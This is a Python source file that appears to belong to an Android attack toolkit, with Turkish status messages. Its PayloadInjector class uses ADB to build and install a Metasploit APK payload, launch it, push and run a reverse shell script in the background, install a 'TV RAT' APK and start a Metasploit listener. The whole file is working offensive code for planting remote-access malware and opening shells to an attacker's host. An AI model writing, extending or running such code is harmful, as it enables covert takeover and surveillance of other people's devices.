import os
import time
from typing import Optional, Dict, Any

from core.adb_handler import ADBHandler
from core.payload import Payload
from core.utils import Utils

class PayloadInjector:
    def __init__(self, config: dict):
        self.config = config
        self.adb = ADBHandler(config)
        self.payload = Payload(config)

    def generate_and_install(self, lhost: str, lport: int, device_serial: str = None) -> Dict[str, Any]:
        result = {"success": False, "message": "", "apk_path": ""}
        apk_path = "outputs/payloads/generated.apk"
        if not self.payload.generate_apk(lhost, lport, apk_path):
            result["message"] = "APK olusturulamadi"
            return result
        result["apk_path"] = apk_path
        if not os.path.exists(apk_path):
            result["message"] = "APK dosyasi bulunamadi"
            return result
        if self.adb.install(apk_path, device_serial):
            result["success"] = True
            result["message"] = "APK basariyla yuklendi"
            return result
        result["message"] = "APK yukleme basarisiz"
        return result

    def run_payload(self, package_name: str = "com.metasploit.stage", device_serial: str = None) -> bool:
        cmd = f"monkey -p {package_name} 1"
        stdout, stderr, code = self.adb.shell(cmd, device_serial)
        return code == 0

    def generate_reverse_shell_and_push(self, lhost: str, lport: int, device_serial: str = None) -> bool:
        shell_path = "outputs/payloads/reverse_shell.sh"
        if not self.payload.generate_reverse_shell(lhost, lport, shell_path):
            return False
        if not self.adb.push(shell_path, "/data/local/tmp/reverse_shell.sh", device_serial):
            return False
        self.adb.shell("chmod 755 /data/local/tmp/reverse_shell.sh", device_serial)
        return True

    def execute_reverse_shell(self, device_serial: str = None) -> bool:
        stdout, stderr, code = self.adb.shell("nohup /data/local/tmp/reverse_shell.sh &", device_serial)
        return code == 0

    def install_tv_rat(self, apk_path: str, device_serial: str = None) -> bool:
        if not os.path.exists(apk_path):
            return False
        return self.adb.install(apk_path, device_serial)

    def start_msf_handler(self, lhost: str, lport: int) -> bool:
        try:
            self.payload.start_msf_handler(lhost, lport)
            return True
        except Exception:
            return False